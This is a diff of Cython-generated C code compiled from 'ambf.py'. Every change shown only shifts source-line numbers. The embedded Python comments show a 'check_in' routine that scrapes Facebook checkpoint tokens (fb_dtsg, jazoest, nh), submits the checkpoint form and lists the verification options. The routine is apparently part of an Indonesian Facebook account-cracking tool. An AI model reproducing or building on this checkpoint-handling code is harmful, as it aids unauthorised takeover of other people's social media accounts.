-      __pyx_t_4 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L1_error)
+      __pyx_t_4 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 649, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_4);
       if (__pyx_t_6) {
         __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_6); __pyx_t_6 = NULL;
@@ -20263,29 +20022,29 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_GIVEREF(__pyx_t_3);
       PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_7, __pyx_t_3);
       __pyx_t_3 = 0;
-      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 649, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     }
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_value); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_s_value); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 649, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
     __pyx_v_jzst = __pyx_t_5;
     __pyx_t_5 = 0;
 
-    /* "ambf.py":657
+    /* "ambf.py":650
  * 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
  * 		jzst = form.find("input",{"name":"jazoest"})["value"]
  * 		nh   = form.find("input",{"name":"nh"})["value"]             # <<<<<<<<<<<<<<
  * 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
  * 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
  */
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 657, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 650, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_name, __pyx_n_s_nh) < 0) __PYX_ERR(0, 657, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_name, __pyx_n_s_nh) < 0) __PYX_ERR(0, 650, __pyx_L1_error)
     __pyx_t_3 = NULL;
     __pyx_t_7 = 0;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -20301,7 +20060,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCALL
     if (PyFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_s_input, __pyx_t_4};
-      __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 657, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
@@ -20310,14 +20069,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCCALL
     if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_n_s_input, __pyx_t_4};
-      __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 657, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     } else
     #endif
     {
-      __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 657, __pyx_L1_error)
+      __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 650, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_6);
       if (__pyx_t_3) {
         __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_3); __pyx_t_3 = NULL;
@@ -20328,66 +20087,66 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_GIVEREF(__pyx_t_4);
       PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_7, __pyx_t_4);
       __pyx_t_4 = 0;
-      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 657, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
     }
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_value); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 657, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_value); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 650, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
     __pyx_v_nh = __pyx_t_2;
     __pyx_t_2 = 0;
 
-    /* "ambf.py":658
+    /* "ambf.py":651
  * 		jzst = form.find("input",{"name":"jazoest"})["value"]
  * 		nh   = form.find("input",{"name":"nh"})["value"]
  * 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}             # <<<<<<<<<<<<<<
  * 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]
  */
-    __pyx_t_2 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 658, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 651, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_fb_dtsg, __pyx_v_dtsg) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_fb_dtsg, __pyx_v_dtsg) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_jazoest, __pyx_v_jzst) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_jazoest, __pyx_v_jzst) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_checkpoint_data, __pyx_kp_s__7) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_submit_Continue, __pyx_n_s_Lanjutkan) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
-    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_nh, __pyx_v_nh) < 0) __PYX_ERR(0, 658, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_fb_dtsg, __pyx_v_dtsg) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_fb_dtsg, __pyx_v_dtsg) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_jazoest, __pyx_v_jzst) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_jazoest, __pyx_v_jzst) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_checkpoint_data, __pyx_kp_s__7) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_kp_s_submit_Continue, __pyx_n_s_Lanjutkan) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_nh, __pyx_v_nh) < 0) __PYX_ERR(0, 651, __pyx_L1_error)
     __pyx_v_dataD = ((PyObject*)__pyx_t_2);
     __pyx_t_2 = 0;
 
-    /* "ambf.py":659
+    /* "ambf.py":652
  * 		nh   = form.find("input",{"name":"nh"})["value"]
  * 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
  * 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")             # <<<<<<<<<<<<<<
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_parser); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_parser); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
-    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
-    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_form, __pyx_n_s_action); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_form, __pyx_n_s_action); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = PyNumber_Add(__pyx_v_mb, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_3 = PyNumber_Add(__pyx_v_mb, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_GIVEREF(__pyx_t_3);
     PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_3);
     __pyx_t_3 = 0;
-    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_v_dataD) < 0) __PYX_ERR(0, 659, __pyx_L1_error)
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_4, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 659, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_v_dataD) < 0) __PYX_ERR(0, 652, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_4, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 659, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 652, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -20405,7 +20164,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCALL
     if (PyFunction_Check(__pyx_t_5)) {
       PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_t_3, __pyx_kp_s_html_parser};
-      __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 659, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 652, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
@@ -20414,14 +20173,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCCALL
     if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
       PyObject *__pyx_temp[3] = {__pyx_t_1, __pyx_t_3, __pyx_kp_s_html_parser};
-      __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 659, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 652, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     } else
     #endif
     {
-      __pyx_t_4 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 659, __pyx_L1_error)
+      __pyx_t_4 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_4);
       if (__pyx_t_1) {
         __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_1); __pyx_t_1 = NULL;
@@ -20432,7 +20191,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_GIVEREF(__pyx_kp_s_html_parser);
       PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_7, __pyx_kp_s_html_parser);
       __pyx_t_3 = 0;
-      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 659, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 652, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     }
@@ -20440,16 +20199,16 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     __pyx_v_xnxx = __pyx_t_2;
     __pyx_t_2 = 0;
 
-    /* "ambf.py":660
+    /* "ambf.py":653
  * 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
  * 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]             # <<<<<<<<<<<<<<
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")
  * 		for opt in range(len(ngew)):
  */
-    __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 660, __pyx_L1_error)
+    __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 653, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_xnxx, __pyx_n_s_find_all); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 660, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_xnxx, __pyx_n_s_find_all); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __pyx_t_3 = NULL;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
@@ -20463,16 +20222,16 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_n_s_option) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_n_s_option);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 660, __pyx_L1_error)
+    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     if (likely(PyList_CheckExact(__pyx_t_5)) || PyTuple_CheckExact(__pyx_t_5)) {
       __pyx_t_4 = __pyx_t_5; __Pyx_INCREF(__pyx_t_4); __pyx_t_8 = 0;
       __pyx_t_9 = NULL;
     } else {
-      __pyx_t_8 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 660, __pyx_L1_error)
+      __pyx_t_8 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_4);
-      __pyx_t_9 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 660, __pyx_L1_error)
+      __pyx_t_9 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 653, __pyx_L1_error)
     }
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
     for (;;) {
@@ -20480,17 +20239,17 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
         if (likely(PyList_CheckExact(__pyx_t_4))) {
           if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_4)) break;
           #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-          __pyx_t_5 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 660, __pyx_L1_error)
+          __pyx_t_5 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 653, __pyx_L1_error)
           #else
-          __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 660, __pyx_L1_error)
+          __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L1_error)
           __Pyx_GOTREF(__pyx_t_5);
           #endif
         } else {
           if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
           #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
-          __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 660, __pyx_L1_error)
+          __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_8); __Pyx_INCREF(__pyx_t_5); __pyx_t_8++; if (unlikely(0 < 0)) __PYX_ERR(0, 653, __pyx_L1_error)
           #else
-          __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 660, __pyx_L1_error)
+          __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L1_error)
           __Pyx_GOTREF(__pyx_t_5);
           #endif
         }
@@ -20500,7 +20259,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
           PyObject* exc_type = PyErr_Occurred();
           if (exc_type) {
             if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
-            else __PYX_ERR(0, 660, __pyx_L1_error)
+            else __PYX_ERR(0, 653, __pyx_L1_error)
           }
           break;
         }
@@ -20508,57 +20267,57 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       }
       __Pyx_XDECREF_SET(__pyx_v_yy, __pyx_t_5);
       __pyx_t_5 = 0;
-      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_yy, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 660, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_yy, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
-      if (unlikely(__Pyx_ListComp_Append(__pyx_t_2, (PyObject*)__pyx_t_5))) __PYX_ERR(0, 660, __pyx_L1_error)
+      if (unlikely(__Pyx_ListComp_Append(__pyx_t_2, (PyObject*)__pyx_t_5))) __PYX_ERR(0, 653, __pyx_L1_error)
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
     }
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_v_ngew = ((PyObject*)__pyx_t_2);
     __pyx_t_2 = 0;
 
-    /* "ambf.py":661
+    /* "ambf.py":654
  * 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")             # <<<<<<<<<<<<<<
  * 		for opt in range(len(ngew)):
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])
  */
-    __pyx_t_8 = PyList_GET_SIZE(__pyx_v_ngew); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 661, __pyx_L1_error)
-    __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 661, __pyx_L1_error)
+    __pyx_t_8 = PyList_GET_SIZE(__pyx_v_ngew); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 654, __pyx_L1_error)
+    __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 661, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 654, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = PyNumber_Add(__pyx_kp_s_terdapat, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 661, __pyx_L1_error)
+    __pyx_t_2 = PyNumber_Add(__pyx_kp_s_terdapat, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_opsi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 661, __pyx_L1_error)
+    __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_opsi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 654, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 661, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 654, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":662
+    /* "ambf.py":655
  * 		ngew = [yy.text for yy in xnxx.find_all("option")]
  * 		print(" [+] terdapat "+str(len(ngew))+" opsi ")
  * 		for opt in range(len(ngew)):             # <<<<<<<<<<<<<<
  * 			print(" ["+str(opt+1)+"] "+ngew[opt])
  * 	elif "login_error" in str(run):
  */
-    __pyx_t_8 = PyList_GET_SIZE(__pyx_v_ngew); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 662, __pyx_L1_error)
-    __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 662, __pyx_L1_error)
+    __pyx_t_8 = PyList_GET_SIZE(__pyx_v_ngew); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 655, __pyx_L1_error)
+    __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
